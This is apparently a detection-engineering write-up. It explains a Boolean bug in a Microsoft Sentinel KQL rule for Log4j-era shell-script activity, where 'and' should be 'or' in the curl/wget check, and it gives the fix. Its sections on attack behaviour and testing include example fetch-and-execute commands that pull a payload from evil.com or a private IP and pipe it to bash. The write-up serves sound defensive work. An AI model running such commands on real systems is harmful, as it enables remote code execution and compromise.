# ADE4-03 Example: Suspicious Shell Script Detection - Incorrect Expression

**Bug Category:** ADE4-03 Logic Manipulation - Incorrect Expression

## Original Rule

**Source:** [Microsoft Sentinel - Suspicious Shell script detected](https://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Apache%20Log4j%20Vulnerability%20Detection/Hunting%20Queries/Suspicious_ShellScript_Activity.yaml)

**Description:** Detects post-compromise suspicious shell scripts that attackers use for downloading and executing malicious files. Created in response to the Log4j vulnerability.

```yaml
query: |
  Syslog
  | where Facility == 'user'
  | where SyslogMessage has "AUOMS_EXECVE"
  | parse SyslogMessage with "type=" EventType " audit(" * "): " EventData
  | where EventType =~ "AUOMS_EXECVE"
  | project TimeGenerated, EventType, Computer, EventData
  | parse EventData with * "syscall=" syscall " syscall_r=" * " success=" success " exit=" exit " a0" * " ppid=" ppid " pid=" pid " audit_user=" audit_user " auid=" auid " user=" user " uid=" uid " group=" group " gid=" gid "effective_user=" effective_user " euid=" euid " set_user=" set_user " suid=" suid " filesystem_user=" filesystem_user " fsuid=" fsuid " effective_group=" effective_group " egid=" egid " set_group=" set_group " sgid=" sgid " filesystem_group=" filesystem_group " fsgid=" fsgid " tty=" tty " ses=" ses " comm=\"" comm "\" exe=\"" exe "\"" * "cwd=\"" cwd "\"" * "name=\"" name "\"" * "cmdline=" cmdline
  | extend cmdline = trim_end('redactors=.*',cmdline)
  | where exe has_any ("bash","dash")
  | where cmdline matches regex  "[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}"
  | where cmdline has "curl" and cmdline has "wget"
  | project TimeGenerated, Computer, audit_user, user, cmdline
  | extend timestamp = TimeGenerated
  | extend Host_0_HostName = Computer
  | extend Account_0_Name = user
  | sort by TimeGenerated desc
```

## The Bug: Incorrect Boolean Expression

**Critical line:**
```kql
| where cmdline has "curl" and cmdline has "wget"
```

**What this requires:** Command line must contain BOTH "curl" **AND** "wget" substrings simultaneously.

**Rule intent:** Detect command execution involving download utilities (`curl` **OR** `wget`)

**Actual logic:** Requires both utilities in the same command line

## Why This Is a Bug

### Typical Attack Behavior

Attackers typically use **one download utility at a time:**

**Using curl:**
```bash
curl -o /tmp/payload http://evil.com/malware.sh && bash /tmp/payload
```
- Contains "curl" ✓
- Contains "wget" ✗
- **Rule evaluation:** False → No detection

**Using wget:**
```bash
wget -O /tmp/payload http://evil.com/malware.sh && bash /tmp/payload
```
- Contains "curl" ✗
- Contains "wget" ✓
- **Rule evaluation:** False → No detection

### The Only Way This Rule Triggers

**Contrived scenario (unlikely in real attacks):**
```bash
# Someone uses BOTH utilities in one command
curl http://example.com/file1 && wget http://example.com/file2
```
- Contains "curl" ✓
- Contains "wget" ✓
- **Rule evaluation:** True → Detection fires

**Problem:** Real attackers don't typically do this.

## Classification: ADE4-03 - Incorrect Expression

**Definition:** Detection logic has been crafted in a way that the interpreted query rarely creates hits.

**Characteristics:**
- Not an attacker-driven bypass
- A logic construction error in the detection logic itself
- Conjunction (AND) used instead of disjunction (OR)
- Renders detection ineffective by design

**Why it happens:**
- Lack of adversarial emulation
- No testing with generated data before production deployment
- Misunderstanding of Boolean logic requirements

## The Fix

**Change this:**
```kql
| where cmdline has "curl" and cmdline has "wget"
```

**To this:**
```kql
| where cmdline has "curl" or cmdline has "wget"
```

Or more idiomatically in KQL:
```kql
| where cmdline has_any ("curl", "wget")
```

## Impact

**Permanent False Negatives:** The rule will almost never detect real-world malicious download activity because:
1. Attackers use one download tool per command
2. The logic requires both tools simultaneously
3. No testing caught this before deployment

## Testing Validation

**If this rule had been tested with real-world scenarios:**

**Test Case 1: curl download**
```bash
bash -c "curl -s http://192.168.1.100/payload.sh | bash"
```
Expected: ✓ Detection
Actual: ✗ No detection

**Test Case 2: wget download**
```bash
bash -c "wget -qO- http://192.168.1.100/payload.sh | bash"
```
Expected: ✓ Detection
Actual: ✗ No detection

**Test Case 3: Both tools (unrealistic)**
```bash
bash -c "curl http://example.com/a && wget http://example.com/b"
```
Expected: ✓ Detection
Actual: ✓ Detection (but scenario is unrealistic)

## Broader Lesson

**Common Incorrect Expression Patterns:**

**AND when OR is needed:**
```
field contains "string1" AND field contains "string2"  # Rarely both present
```

**Should be:**
```
field contains "string1" OR field contains "string2"   # Either is suspicious
```

**NOT logic without considering valid use cases:**
```
suspicious_action AND NOT (user == "root" OR user == "SYSTEM")
```
This excludes privileged accounts, missing RCE exploits that grant root/SYSTEM access.

---

**Related Documentation:**
- [ADE4 Logic Manipulation](../../docs/taxonomy/ade4-logic-manipulation.md)
- [Detection Logic Bug Theory](../../docs/theory/detection-logic-bugs.md)

**Related Topics:**
- [ADE4-01 Gate Inversion](bits-gate-inversion.md)
- [Risk of Negating Privileged Accounts](../../docs/taxonomy/ade4-logic-manipulation.md#risk-of-negating-privileged-accounts)
